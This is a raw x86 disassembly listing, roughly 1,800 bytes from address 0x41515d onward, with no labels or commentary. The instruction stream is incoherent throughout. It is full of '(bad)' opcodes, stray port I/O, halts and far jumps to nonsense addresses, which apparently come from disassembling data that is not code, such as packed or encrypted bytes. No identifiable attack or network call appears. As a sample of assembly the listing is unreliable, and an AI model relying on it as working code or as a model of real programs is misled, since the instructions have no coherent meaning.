  41515d:	push   ss
  41515e:	shr    ch,1
  415160:	cld    
  415161:	sbb    BYTE PTR [eax+0xf],bh
  415164:	jo     0x4151b6
  415166:	test   DWORD PTR [ebp-0x195c6cb7],ebp
  41516c:	cmp    eax,0xc32d5cb5
  415171:	out    0x5e,al
  415173:	mov    ds:0xfc9bc610,eax
  415178:	mov    bh,0x8e
  41517a:	mov    dl,0x7f
  41517c:	mov    al,0xf8
  41517e:	xchg   edi,eax
  41517f:	loope  0x415115
  415181:	mov    dl,0x16
  415183:	popa   
  415184:	cmp    eax,0x505a23a7
  415189:	inc    ebx
  41518a:	outs   dx,DWORD PTR ds:[esi]
  41518b:	inc    esi
  41518c:	and    BYTE PTR [ecx-0x51ff5387],dl
  415192:	loopne 0x415155
  415194:	cmc    
  415195:	fimul  DWORD PTR [edi-0x7a]
  415198:	add    al,0xd3
  41519a:	jo     0x4151fb
  41519c:	mov    ah,0x57
  41519e:	int    0x7e
  4151a0:	lods   eax,DWORD PTR ds:[esi]
  4151a1:	inc    ecx
  4151a2:	inc    eax
  4151a3:	fldenv [esi]
  4151a5:	jge    0x4151cc
  4151a7:	fs inc edi
  4151a9:	mov    ch,0xcf
  4151ab:	push   es
  4151ac:	cmp    eax,0x8a673e99
  4151b1:	inc    ebx
  4151b2:	stos   DWORD PTR es:[edi],eax
  4151b3:	test   al,0xec
  4151b5:	(bad)  
  4151b6:	hlt    
  4151b7:	aam    0x6c
  4151b9:	and    esp,DWORD PTR [edi+0x38fd75b2]
  4151bf:	adc    BYTE PTR [esi],al
  4151c1:	dec    edi
  4151c2:	daa    
  4151c3:	fst    QWORD PTR [esi]
  4151c5:	cmp    ax,0xa7bc
  4151c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151ca:	and    DWORD PTR [esi+0x160f062f],0xf7ebd5d4
  4151d4:	push   ebp
  4151d5:	dec    ecx
  4151d6:	das    
  4151d7:	ds push eax
  4151d9:	sahf   
  4151da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151db:	pop    edi
  4151dd:	push   0xffffffc1
  4151df:	(bad)  
  4151e0:	jb     0x41518f
  4151e2:	mov    eax,0x40d7da70
  4151e7:	mov    esi,0xe524eab2
  4151ec:	sbb    dh,BYTE PTR [eax]
  4151ee:	lods   eax,DWORD PTR ds:[esi]
  4151ef:	inc    ebx
  4151f0:	xlat   BYTE PTR ds:[ebx]
  4151f1:	inc    esp
  4151f2:	cdq    
  4151f3:	push   ecx
  4151f4:	shl    BYTE PTR es:[ebp+0x19],cl
  4151f8:	cwde   
  4151f9:	cld    
  4151fa:	pop    es
  4151fb:	xchg   ebx,eax
  4151fc:	push   ss
  4151fd:	fst    QWORD PTR [edx+0x66]
  415200:	xchg   DWORD PTR [eax],ecx
  415202:	sub    eax,0xc4035c78
  415207:	push   ecx
  415208:	xchg   eax,ecx
  41520a:	mov    ecx,ebx
  41520c:	mov    eax,ds:0x1314ea47
  415211:	adc    al,0x75
  415213:	xor    DWORD PTR [ebx-0x740298a8],esp
  415219:	add    DWORD PTR ds:0xa8b54e27,eax
  41521f:	mov    esi,0xb7543089
  415224:	or     al,0x76
  415226:	jge    0x41526f
  415228:	popf   
  415229:	scas   eax,DWORD PTR es:[edi]
  41522a:	push   esi
  41522b:	sub    eax,0xfab5aebb
  415230:	out    dx,eax
  415231:	inc    esp
  415232:	or     cl,BYTE PTR [esi]
  415234:	inc    ebp
  415235:	xchg   DWORD PTR [ebx-0x34],esi
  415238:	or     BYTE PTR [ebp+0x4f],cl
  41523b:	and    eax,0x7bc17fd8
  415240:	fwait
  415241:	repnz mov al,0x75
  415244:	out    dx,eax
  415245:	jl     0x415241
  415247:	addr16 retf 
  415249:	ss mov dl,cl
  41524c:	jle    0x4152ca
  41524e:	cmp    ch,cl
  415250:	cmp    DWORD PTR [eax],0x4f523507
  415256:	rcr    DWORD PTR [esi+esi*2],0x1e
  41525a:	sub    ecx,eax
  41525c:	cmp    al,0x93
  41525e:	dec    edx
  41525f:	into   
  415260:	out    dx,eax
  415261:	int    0xe8
  415263:	push   ds
  415264:	jmp    0x81e22ef7
  415269:	jmp    0xc5ee:0x6c1629c3
  415270:	ds xchg ebp,eax
  415272:	std    
  415273:	in     eax,dx
  415274:	stc    
  415275:	nop
  415276:	ins    BYTE PTR es:[edi],dx
  415277:	stc    
  415278:	ret    0x3535
  41527b:	xor    cl,BYTE PTR [esi]
  41527d:	dec    esp
  41527e:	rcr    BYTE PTR [edx+0x1140cc22],0x53
  415285:	outs   dx,DWORD PTR ds:[esi]
  415286:	dec    esi
  415287:	pop    edx
  415288:	(bad)  
  415289:	cdq    
  41528a:	addr16 gs retf 0x14a8
  41528f:	fsub   st,st(6)
  415291:	out    0x67,al
  415293:	and    al,0xff
  415295:	std    
  415296:	sahf   
  415297:	(bad)  
  415298:	lods   eax,DWORD PTR ds:[esi]
  415299:	sub    esi,ebp
  41529b:	retf   0xcbdd
  41529e:	call   0x1469:0x6b07d342
  4152a5:	shl    BYTE PTR [ebx+0x28],cl
  4152a8:	int    0x92
  4152aa:	mov    al,0x53
  4152ac:	pop    esi
  4152ad:	xchg   edx,eax
  4152ae:	push   ds
  4152af:	mov    ah,0xaf
  4152b1:	sbb    bl,BYTE PTR [ebp+0x6a7d50e4]
  4152b7:	cmp    DWORD PTR [ebp-0x2],esp
  4152ba:	lds    eax,FWORD PTR [edi]
  4152bc:	loopne 0x4152a2
  4152be:	adc    eax,0xff2d4ea7
  4152c3:	adc    eax,0x539909e7
  4152c8:	sub    DWORD PTR [eax+edx*2+0x19d3c832],edx
  4152cf:	fisttp WORD PTR [edx]
  4152d1:	push   esi
  4152d2:	push   ss
  4152d3:	fstp   TBYTE PTR [eax+eiz*1+0x36]
  4152d7:	ret    
  4152d8:	xchg   edx,eax
  4152d9:	push   ebx
  4152da:	out    dx,al
  4152db:	aam    0x75
  4152dd:	pop    esi
  4152de:	leave  
  4152df:	xor    DWORD PTR [ecx],esi
  4152e1:	pop    esi
  4152e2:	push   ds
  4152e3:	aaa    
  4152e4:	mov    bl,0x47
  4152e6:	stos   DWORD PTR es:[edi],eax
  4152e7:	xchg   esp,eax
  4152e8:	lods   al,BYTE PTR ds:[esi]
  4152e9:	popf   
  4152ea:	les    esp,FWORD PTR [edi-0x1a97afd]
  4152f0:	(bad)  
  4152f1:	jmp    0x80aa1e1c
  4152f6:	stos   DWORD PTR es:[edi],eax
  4152f7:	add    esi,eax
  4152f9:	scas   al,BYTE PTR es:[edi]
  4152fa:	inc    edx
  4152fb:	cmp    DWORD PTR [esi],0x8fc38fae
  415301:	or     ah,BYTE PTR [esi]
  415303:	xchg   esp,eax
  415304:	mov    eax,ds:0xf3fd14d9
  415309:	ret    
  41530a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41530b:	xchg   edi,eax
  41530c:	pop    ebx
  41530d:	cli    
  41530e:	jb     0x415339
  415310:	cmc    
  415311:	jge    0x415373
  415313:	mov    edx,0x2fdf841d
  415318:	xor    eax,0xdc0df052
  41531d:	retf   
  41531e:	mov    ah,0x7d
  415320:	jmp    0x41532d
  415322:	mov    dl,0x91
  415324:	sub    al,0xf6
  415326:	dec    esi
  415327:	xlat   BYTE PTR ds:[ebx]
  415328:	cmp    esi,ebx
  41532a:	mov    al,0xdf
  41532c:	cmp    DWORD PTR [edx],edi
  41532e:	shl    BYTE PTR [ebp-0x65],cl
  415331:	call   0xc955e201
  415336:	mov    dl,0x2f
  415338:	sub    BYTE PTR [ecx+ebp*8+0x14f6d6df],0xb2
  415340:	loop   0x4152c3
  415342:	or     al,0x17
  415344:	stos   DWORD PTR es:[edi],eax
  415345:	dec    edi
  415346:	cmp    ecx,edi
  415348:	into   
  415349:	(bad)  
  41534a:	scas   al,BYTE PTR es:[edi]
  41534b:	(bad)  
  41534c:	rol    DWORD PTR [ebx+0x1eedc06e],cl
  415352:	and    DWORD PTR [edx],ecx
  415354:	adc    DWORD PTR [ecx-0x6bf46f31],esi
  41535a:	loopne 0x41532e
  41535c:	rcr    DWORD PTR [eiz*8-0x2a078942],1
  415363:	push   es
  415364:	hlt    
  415365:	lea    ebp,[edi]
  415367:	mov    gs,edx
  415369:	xchg   BYTE PTR [edi],dh
  41536b:	push   ecx
  41536c:	mov    esp,ss
  41536e:	lds    ecx,FWORD PTR [edx-0x7a]
  415371:	adc    eax,0x9236a490
  415376:	mov    ah,0x7e
  415378:	push   esi
  415379:	into   
  41537a:	scas   eax,DWORD PTR es:[edi]
  41537b:	pop    es
  41537c:	add    al,0xc7
  41537e:	mov    ch,0x84
  415380:	mov    al,ds:0x6bda0361
  415385:	(bad)  
  415386:	jmp    0x7e8a:0xa9b2b4c3
  41538d:	int3   
  41538e:	and    ah,bh
  415390:	cmp    DWORD PTR [eax+0x489e4292],eax
  415396:	fsub   QWORD PTR [edi+0x5]
  415399:	mov    ch,0xc4
  41539b:	hlt    
  41539c:	daa    
  41539d:	mov    bh,0xa9
  41539f:	inc    ebp
  4153a0:	out    dx,eax
  4153a1:	or     al,0x4a
  4153a3:	add    eax,0x284b4bf1
  4153a8:	aam    0xc3
  4153aa:	mov    ebx,0x2e3bb4d8
  4153af:	jle    0x415392
  4153b1:	xchg   ebp,eax
  4153b2:	mov    dl,0x30
  4153b4:	cs dec ebp
  4153b6:	fcmovnb st,st(3)
  4153b8:	mov    edx,0x856d78ce
  4153bd:	rcl    DWORD PTR [edi+ebp*8-0x5ef3ab78],0xe6
  4153c5:	stos   BYTE PTR es:[edi],al
  4153c6:	loope  0x4153a2
  4153c8:	fcos   
  4153ca:	loope  0x41535f
  4153cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153cd:	ret    0x4ff7
  4153d0:	lods   al,BYTE PTR ds:[esi]
  4153d1:	xor    dl,cl
  4153d3:	push   esp
  4153d4:	(bad)  
  4153d6:	xchg   esi,eax
  4153d7:	dec    bp
  4153d9:	out    0xbb,al
  4153db:	cmp    ebx,ebx
  4153dd:	sbb    dh,BYTE PTR [eax]
  4153df:	or     BYTE PTR [edx*4-0x699a7928],0xc2
  4153e7:	addr16 icebp 
  4153e9:	sbb    al,0x69
  4153eb:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4153ed:	clc    
  4153ee:	dec    ecx
  4153ef:	add    eax,DWORD PTR gs:0xebf30d2e
  4153f6:	lods   al,BYTE PTR ds:[esi]
  4153f7:	out    dx,al
  4153f8:	sbb    eax,0x9e7ca187
  4153fd:	or     DWORD PTR [esi-0x1d461c5f],eax
  415403:	jge    0x41541f
  415405:	add    DWORD PTR [esi],esi
  415407:	xchg   ebp,eax
  415408:	js     0x415487
  41540a:	pop    ss
  41540b:	adc    ecx,DWORD PTR [ebx]
  41540d:	es addr16 out 0x1d,eax
  415411:	mov    ds:0xb31a664a,eax
  415416:	jnp    0x41548f
  415418:	aam    0xc1
  41541a:	or     ecx,DWORD PTR [edx+eax*8-0xa]
  41541e:	xor    al,BYTE PTR [ecx]
  415420:	and    bl,BYTE PTR [ecx]
  415422:	enter  0x5cb0,0xb6
  415426:	clc    
  415427:	push   eax
  415428:	push   0xffffff86
  41542a:	cmove  ecx,DWORD PTR ds:0x5df61236
  415431:	test   DWORD PTR [edx+0x26],0xf2c43f40
  415438:	fisub  WORD PTR [edx+0x3b]
  41543b:	ja     0x41543c
  41543d:	adc    esi,DWORD PTR [eax-0x5e]
  415440:	add    al,0x67
  415442:	test   ch,bh
  415444:	into   
  415445:	mov    edi,0x962524c6
  41544a:	pop    ebx
  41544b:	ins    DWORD PTR es:[edi],dx
  41544c:	dec    eax
  41544d:	mov    edi,0x4a4fc227
  415452:	cmp    al,0xf3
  415454:	pushf  
  415455:	popf   
  415456:	cdq    
  415457:	aas    
  415458:	push   edi
  415459:	xor    eax,0xf85c65d9
  41545e:	or     dl,BYTE PTR [ebx+edi*2-0x69]
  415462:	(bad)  
  415463:	sbb    eax,0x6315d7b9
  415468:	dec    esi
  415469:	loope  0x41544e
  41546b:	xchg   ebx,eax
  41546c:	je     0x41545d
  41546e:	sub    al,0x8f
  415470:	and    eax,0x8b38d0f8
  415475:	add    al,0x1
  415477:	repnz retf 0xdcfa
  41547b:	jb     0x41544a
  41547d:	push   es
  41547e:	in     eax,0x1b
  415480:	cmc    
  415481:	scas   al,BYTE PTR es:[edi]
  415482:	pop    edi
  415483:	cdq    
  415484:	jg     0x41546a
  415486:	sahf   
  415487:	mov    ecx,0xca3b35b5
  41548c:	sahf   
  41548d:	ror    bl,0x3c
  415490:	ds cmc 
  415492:	sbb    bl,al
  415494:	ficomp WORD PTR [ecx-0x2e7eb37c]
  41549a:	push   ebp
  41549b:	xor    DWORD PTR [ecx+0x6e],0xbcb09098
  4154a2:	dec    edx
  4154a3:	inc    edi
  4154a4:	fld    DWORD PTR [ebp+0x189a5b89]
  4154aa:	mov    al,0xb3
  4154ac:	push   ds
  4154ad:	imul   edi,DWORD PTR [edi+0x447e6b82],0xffffffc6
  4154b4:	mov    ds:0xa2a8fd82,eax
  4154b9:	je     0x41547e
  4154bb:	mov    ch,0xde
  4154bd:	rcr    DWORD PTR [ecx+0x4bc6c786],cl
  4154c3:	and    ch,0xaa
  4154c6:	fldcw  WORD PTR [edi+0x7ab79d1c]
  4154cc:	xor    al,BYTE PTR [esi+edi*8-0x2f1505b2]
  4154d3:	pop    ecx
  4154d4:	ret    
  4154d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154d6:	dec    ebp
  4154d7:	les    esi,FWORD PTR [edi-0x3b183792]
  4154dd:	cmc    
  4154de:	xchg   ebx,eax
  4154df:	(bad)  
  4154e0:	retf   
  4154e1:	cmp    BYTE PTR [esi],bl
  4154e3:	push   0xffffffde
  4154e5:	(bad)  
  4154e7:	iret   
  4154e8:	jb     0x4154ac
  4154ea:	sbb    ah,BYTE PTR [eax+0x3fe840dc]
  4154f0:	mov    edx,0x9e7cea2e
  4154f5:	je     0x415559
  4154f7:	fild   WORD PTR [ebp+0x4e]
  4154fa:	push   eax
  4154fb:	push   ds
  4154fc:	hlt    
  4154fd:	retf   0x13d9
  415500:	jae    0x4154cf
  415502:	ror    DWORD PTR [ecx],cl
  415504:	mov    bh,0xbf
  415506:	or     BYTE PTR [edx+ebx*4],0x2c
  41550a:	mov    dl,0xda
  41550c:	and    al,0x39
  41550e:	xchg   DWORD PTR [esi+0x5d],edx
  415511:	(bad)  
  415512:	cwde   
  415513:	(bad)  [ecx]
  415515:	adc    dl,BYTE PTR [ebp-0x1f]
  415518:	xor    eax,0x5456aee7
  41551d:	dec    ah
  41551f:	fmul   DWORD PTR [eax+eax*4]
  415522:	pop    ebx
  415523:	add    eax,0x4c3a8dc9
  415528:	cmp    ecx,DWORD PTR [eax+esi*2+0x337eda3f]
  41552f:	in     eax,0x28
  415531:	lahf   
  415532:	enter  0x7c2,0x26
  415536:	arpl   si,dx
  415538:	cwde   
  415539:	sub    edi,ebp
  41553b:	bound  edx,QWORD PTR [edi+ebx*4-0xba3b388]
  415542:	aam    0x62
  415544:	gs je  0x4155a7
  415547:	mov    ds:0xc1b590a2,eax
  41554c:	sub    BYTE PTR [esi+0x52c8570e],0x1c
  415553:	or     esi,DWORD PTR [ebp-0x16]
  415556:	or     ch,BYTE PTR [edi-0x4]
  415559:	sub    DWORD PTR [edx+0x45],0xffffff9e
  41555d:	ins    BYTE PTR es:[edi],dx
  41555e:	xchg   esp,eax
  41555f:	xchg   esi,eax
  415560:	scas   eax,DWORD PTR es:[edi]
  415561:	sbb    DWORD PTR [edx+ecx*8-0x3009459d],eax
  415568:	push   0xffffffd9
  41556a:	clc    
  41556b:	test   BYTE PTR [edx],bl
  41556d:	push   ecx
  41556e:	ins    BYTE PTR es:[edi],dx
  41556f:	sub    ecx,edx
  415571:	icebp  
  415572:	lods   al,BYTE PTR ds:[esi]
  415573:	inc    BYTE PTR [esi]
  415575:	daa    
  415576:	mov    fs,WORD PTR [edx]
  415578:	pop    edx
  415579:	stos   DWORD PTR es:[edi],eax
  41557a:	imul   ebp,esi,0xffffff89
  41557d:	dec    eax
  41557e:	push   0xffffff80
  415580:	pop    eax
  415581:	(bad)  
  415582:	push   eax
  415583:	sti    
  415584:	ret    
  415585:	mov    ds:0xd5cb495,eax
  41558a:	jp     0x415598
  41558c:	out    0x5a,eax
  41558e:	test   al,0x80
  415590:	pop    esi
  415591:	xor    ch,al
  415593:	test   BYTE PTR [edx],al
  415595:	push   eax
  415596:	and    eax,0xfe2bc1ae
  41559b:	xor    eax,0x7c84270b
  4155a0:	sub    eax,0x41474d2b
  4155a5:	inc    ecx
  4155a6:	pop    esi
  4155a7:	mov    cl,0x98
  4155a9:	push   es
  4155aa:	scas   al,BYTE PTR es:[edi]
  4155ab:	or     BYTE PTR [ebp-0x285b22ab],dl
  4155b1:	mov    ah,0x5a
  4155b3:	sbb    ebx,DWORD PTR [eax+0x6e8ca5ae]
  4155b9:	adc    esp,DWORD PTR [ecx+edx*8+0x3e8718ff]
  4155c0:	fwait
  4155c1:	mov    esi,0x40c593b0
  4155c6:	pop    ebp
  4155c7:	mov    dl,0xf3
  4155c9:	arpl   ax,bx
  4155cb:	pop    ecx
  4155cc:	outs   dx,BYTE PTR ds:[esi]
  4155cd:	aas    
  4155ce:	mov    al,0x87
  4155d0:	fcmovb st,st(3)
  4155d2:	stc    
  4155d3:	dec    ebp
  4155d4:	dec    ebx
  4155d5:	push   edi
  4155d6:	xchg   ecx,eax
  4155d7:	push   ebp
  4155d8:	push   dx
  4155da:	mov    al,ds:0x9c8e0b87
  4155df:	jb     0x415603
  4155e1:	(bad)  
  4155e2:	in     al,dx
  4155e3:	ror    DWORD PTR [ecx+eax*4-0xbfde0c2],0xf3
  4155eb:	or     BYTE PTR [esi+edx*2-0x5cb4283b],0xfe
  4155f3:	pop    es
  4155f4:	popf   
  4155f5:	jns    0x4155de
  4155f7:	mov    cl,0xbb
  4155f9:	inc    eax
  4155fa:	mov    ds:0x8cd6d3c2,al
  415600:	in     eax,0x38
  415602:	lea    eax,[eax]
  415604:	adc    ebx,edx
  415606:	inc    ebp
  415607:	(bad)  
  415608:	pop    eax
  415609:	xchg   ecx,eax
  41560a:	aaa    
  41560b:	retf   
  41560c:	jecxz  0x415637
  41560e:	and    eax,0x69b5aead
  415613:	jmp    0x41561c
  415615:	pop    esi
  415616:	dec    eax
  415617:	jp     0x4155d1
  415619:	adc    al,0x7f
  41561b:	dec    edx
  41561c:	mov    bh,0x57
  41561e:	outs   dx,DWORD PTR ds:[esi]
  41561f:	jl     0x41568f
  415621:	jns    0x415637
  415623:	ins    BYTE PTR es:[edi],dx
  415624:	sub    eax,DWORD PTR [eax-0x68bf5724]
  41562a:	mov    esp,0x21e76b31
  41562f:	add    BYTE PTR [ebp-0x30b6993d],ah
  415635:	push   edx
  415636:	xchg   ecx,eax
  415637:	mov    ds:0x3bfe0755,eax
  41563c:	push   eax
  41563d:	jbe    0x4156b3
  41563f:	gs in  eax,dx
  415641:	mov    eax,DWORD PTR [ecx-0x1]
  415644:	fisubr WORD PTR [edx-0x6fdfd67e]
  41564a:	xor    BYTE PTR [ebx+esi*2-0x10e971e3],bl
  415651:	rcr    DWORD PTR [bx+0x39],cl
  415655:	xor    eax,0xed7c9f59
  41565a:	cmp    ch,cl
  41565c:	add    cl,bl
  41565e:	lock mov bl,0xde
  415662:	jae    0x4156b7
  415664:	jo     0x41562a
  415666:	out    dx,eax
  415667:	rcl    BYTE PTR [eax],cl
  415669:	sub    edi,esp
  41566b:	imul   esi,DWORD PTR [esi],0xffffffd6
  41566e:	stc    
  41566f:	sahf   
  415670:	shr    BYTE PTR [edx],0x8d
  415673:	pop    es
  415674:	jmp    0x4156d9
  415676:	inc    esp
  415677:	push   cs
  415678:	(bad)  
  415679:	pop    ebp
  41567a:	arpl   ax,si
  41567c:	pop    esp
  41567d:	ror    eax,1
  41567f:	pop    es
  415680:	pop    ecx
  415681:	or     esp,edx
  415683:	(bad)  
  415684:	retf   
  415685:	xchg   ecx,eax
  415686:	cs jae 0x4156d2
  415689:	cdq    
  41568a:	in     al,0x24
  41568c:	das    
  41568d:	retf   
  41568e:	xchg   ecx,eax
  41568f:	loopne 0x4156e3
  415691:	(bad)  
  415692:	cmp    ecx,DWORD PTR [eax+0x1a5570df]
  415698:	repz mov ch,0x9
  41569b:	push   ebp
  41569c:	sbb    DWORD PTR [eax],0x9bb1620d
  4156a2:	mov    bl,0xfe
  4156a4:	test   bh,dh
  4156a6:	mov    bh,0x43
  4156a8:	mov    esi,0xaf4cd6bf
  4156ad:	int3   
  4156ae:	ret    
  4156af:	outs   dx,BYTE PTR ds:[esi]
  4156b0:	mov    WORD PTR [ecx-0x10],?
  4156b3:	ja     0x41567d
  4156b5:	fist   DWORD PTR [eax+0x48046e19]
  4156bb:	mov    ecx,0x919846d8
  4156c0:	lods   al,BYTE PTR ds:[esi]
  4156c1:	(bad)  
  4156c2:	cs test cl,ch
  4156c5:	mov    bl,0xf1
  4156c7:	jae    0x41569c
  4156c9:	(bad)  
  4156ca:	sub    bh,BYTE PTR [ebx]
  4156cc:	neg    DWORD PTR [esi+0x538a8566]
  4156d2:	ret    
  4156d3:	js     0x41571d
  4156d5:	or     esi,ecx
  4156d7:	stc    
  4156d8:	int3   
  4156d9:	adc    eax,0xacaa9cb3
  4156de:	das    
  4156df:	and    bl,ch
  4156e1:	sbb    ch,BYTE PTR [eax]
  4156e3:	adc    BYTE PTR [ecx+esi*8-0x6cd643aa],0x11
  4156eb:	and    ebx,edx
  4156ed:	push   ebp
  4156ee:	xchg   ebp,eax
  4156ef:	sbb    al,0xfb
  4156f1:	xlat   BYTE PTR ds:[ebx]
  4156f2:	je     0x415765
  4156f4:	sub    BYTE PTR [edx+ebp*4],dl
  4156f7:	in     al,dx
  4156f8:	mov    cl,0xb6
  4156fa:	push   ds
  4156fb:	stos   BYTE PTR es:[edi],al
  4156fc:	pop    ds
  4156fd:	std    
  4156fe:	imul   edx,esp,0x8d4e4645
  415704:	fsub   QWORD PTR [edx-0x429283af]
  41570a:	jl     0x41569b
  41570c:	push   edx
  41570d:	pop    ebx
  41570e:	jmp    0x7b516b3d
  415713:	mov    al,ds:0x3990c0a8
  415718:	popa   
  415719:	push   ds
  41571a:	sbb    edx,DWORD PTR [esi]
  41571c:	ins    BYTE PTR es:[edi],dx
  41571d:	call   0xb04c:0xb6f71e73
  415724:	ins    DWORD PTR es:[edi],dx
  415725:	pop    ecx
  415726:	dec    edi
  415727:	in     eax,dx
  415728:	mov    edx,0xb129d9b2
  41572d:	ja     0x41578a
  41572f:	sub    DWORD PTR [esi-0x76],eax
  415732:	cs (bad) 
  415734:	aaa    
  415735:	(bad)  
  415736:	fdivr  DWORD PTR [edx-0x23c73580]
  41573c:	nop
  41573d:	pop    es
  41573e:	sbb    ecx,DWORD PTR [edi+0x135d5787]
  415744:	pop    ecx
  415745:	lock push ecx
  415747:	cdq    
  415748:	push   ebx
  415749:	dec    esp
  41574a:	pextrw ebx,(bad),0xc5
  41574c:	cwde   
  41574d:	pop    esi
  41574e:	out    0xd9,al
  415750:	push   esi
  415751:	inc    esp
  415752:	push   0xf31c5141
  415757:	retf   
  415758:	xchg   edx,eax
  415759:	and    ebx,edx
  41575b:	loope  0x41571b
  41575d:	rcr    DWORD PTR [ebx+0x1a],cl
  415760:	lods   al,BYTE PTR ds:[esi]
  415761:	into   
  415762:	mov    ?,WORD PTR [edx-0x7b]
  415765:	fidivr WORD PTR [ebp*2-0x26461ff4]
  41576c:	push   eax
  41576d:	sbb    BYTE PTR [ecx],cl
  41576f:	mov    WORD PTR [edi-0x1ed9cfb7],gs
  415775:	aam    0x52
  415777:	and    BYTE PTR [edi+0x1a],al
  41577a:	jae    0x415760
  41577c:	mov    ss,WORD PTR [ebp-0x50]
  41577f:	jbe    0x4157b7
  415781:	bound  edx,QWORD PTR [ecx+0x11]
  415784:	push   ebp
  415785:	and    eax,0x230efea4
  41578a:	sbb    eax,0xd23c4581
  41578f:	std    
  415790:	xor    DWORD PTR [edi+0x5689250b],0xbf41d618
  41579a:	stos   BYTE PTR es:[edi],al
  41579b:	lods   al,BYTE PTR ds:[esi]
  41579c:	inc    edx
  41579d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41579e:	sbb    edx,esi
  4157a0:	aad    0xb7
  4157a2:	ins    DWORD PTR es:[edi],dx
  4157a3:	jmp    0x4157f1
  4157a5:	pusha  
  4157a6:	outs   dx,BYTE PTR ds:[esi]
  4157a7:	xor    eax,0xd067e2da
  4157ac:	cmp    edi,DWORD PTR [edx]
  4157ae:	popa   
  4157af:	mov    bh,0x64
  4157b1:	(bad)  
  4157b2:	test   eax,0x4741fa77
  4157b7:	xchg   BYTE PTR [esi-0x64],ch
  4157ba:	mov    edx,0xf41e3cc6
  4157bf:	dec    esp
  4157c0:	pop    DWORD PTR [edi-0x71d5b047]
  4157c6:	cmp    DWORD PTR [edx],0xffffffcd
  4157c9:	xlat   BYTE PTR ds:[ebx]
  4157ca:	mov    ds:0x3cb407a3,al
  4157cf:	fs push ss
  4157d1:	jne    0x415768
  4157d3:	fs pop ss
  4157d5:	lods   al,BYTE PTR ds:[esi]
  4157d6:	jmp    0x18e4:0x79fabf7c
  4157dd:	and    eax,0xbc635259
  4157e2:	cmc    
  4157e3:	bound  ebp,QWORD PTR [eax+0xc]
  4157e6:	xchg   edx,eax
  4157e8:	jle    0x4157b6
  4157ea:	retf   
  4157eb:	fwait
  4157ec:	outs   dx,BYTE PTR ds:[esi]
  4157ed:	enter  0xb36c,0x8b
  4157f1:	xchg   esi,eax
  4157f2:	mov    edi,0x4c23cf68
  4157f7:	mov    ebp,0x9424229d
  4157fc:	repnz add esp,DWORD PTR [esi+0x1a81139b]
  415803:	xor    DWORD PTR [ebx+0x7303614d],eax
  415809:	push   ss
  41580a:	ja     0x4157bd
  41580c:	jne    0x41585e
  41580e:	jbe    0x415854
  415810:	mov    eax,0x621dfda5
  415815:	aas    
  415816:	fild   WORD PTR [ecx+0x444584a]
  41581c:	push   esp
  41581d:	sub    BYTE PTR [eax+0xbc48b35],dh
  415823:	pop    edx
  415824:	push   esi
  415825:	inc    esp
  415826:	or     eax,0x6bdd6c3b
  41582b:	test   BYTE PTR [ecx-0x1b90a1e9],0xc5
  415832:	cmp    ebx,DWORD PTR [eax-0x2]
  415835:	cmp    DWORD PTR [ebx],0x36
  415838:	ss inc edi
  41583a:	test   ecx,edx
  41583c:	adc    BYTE PTR [esi+0x6d],0x1e
  415840:	push   ecx
  415841:	ret    
  415842:	stos   BYTE PTR es:[edi],al
  415843:	push   ss
  415844:	push   0xd9644c70
  415849:	cmp    edi,DWORD PTR [edi+ecx*2-0x1f]
  41584d:	pusha  
  41584e:	mov    ebx,DWORD PTR [eax-0x79929183]
  415854:	jbe    0x4158a1
  415856:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415857:	xor    eax,0x28c3cc4f
  41585c:	pop    eax
  41585d:	scas   eax,DWORD PTR es:[edi]
  41585e:	sub    BYTE PTR [ecx],dl
  415860:	sub    BYTE PTR [edx*1-0x3ec02a5c],dl
  415867:	push   esp
  415868:	in     al,0x35
  41586a:	jo     0x415862
  41586c:	push   0x4822d166
  415871:	pop    ds
  415872:	lds    esp,FWORD PTR [edi]
  415874:	jl     0x415856
  415876:	jecxz  0x4158e4
  415878:	ror    BYTE PTR [ecx-0x556d58a8],1
  41587e:	inc    cx
  415880:	popa   
  415881:	cdq    
  415882:	int3   
  415883:	jecxz  0x41588a
  415885:	sbb    BYTE PTR [eax],0x71
  415888:	mov    edi,0xf7ccc64e
  41588d:	sub    al,0x60
  41588f:	pmulhw mm5,QWORD PTR [ecx-0x5d5dceb5]
  415896:	pop    edi
  415897:	popf   
  415898:	dec    ebp
  415899:	push   ecx
  41589a:	sbb    eax,0xd6915c99
  41589f:	sub    BYTE PTR ds:0x8eac5dbc,cl
  4158a5:	jecxz  0x41591d
  4158a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158a8:	cmc    
  4158a9:	adc    eax,0xa93df115
  4158ae:	fucomp st(7)
  4158b0:	es retf 0x779d
  4158b4:	(bad)  
  4158b5:	dec    eax
  4158b6:	cmp    eax,0x7037ee69
  4158bb:	repz imul ecx,DWORD PTR [edx],0xffffffb8
  4158bf:	daa    
  4158c0:	pushf  
  4158c1:	xchg   edx,eax
  4158c2:	inc    esi
  4158c3:	pop    ebx
  4158c4:	fwait
  4158c5:	call   0x27b9c991
  4158ca:	pop    esp
  4158cb:	push   ss
  4158cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158cd:	xchg   esp,eax
  4158ce:	jnp    0x41588a
  4158d0:	fidivr DWORD PTR [edx]
  4158d2:	cmp    al,0x87
  4158d4:	mov    edx,DWORD PTR [ecx+0x5d97c6e8]
  4158da:	sbb    DWORD PTR [esi+eiz*2],0x26
  4158de:	xchg   ebp,eax
  4158df:	mov    dh,0xd4
  4158e1:	call   0x9301c374
  4158e6:	loop   0x41593f
  4158e8:	rcr    BYTE PTR [edi],1
  4158ea:	mov    eax,ds
  4158ec:	or     bl,cl
  4158ee:	scas   al,BYTE PTR es:[edi]
  4158ef:	cwde   
  4158f0:	jmp    0x37516533
  4158f5:	pusha  
  4158f6:	push   esp
  4158f7:	inc    esp
  4158f8:	lahf   
  4158f9:	fwait
  4158fa:	or     eax,0x8889bde5
  4158ff:	jne    0x415883
  415901:	or     DWORD PTR [ebp-0x65],eax
  415904:	loop   0x4158de
  415906:	pop    ss
  415907:	fwait
  415908:	jb     0x415926
  41590a:	lods   al,BYTE PTR ds:[esi]
  41590b:	mov    ds:0x3fdcc0f7,al
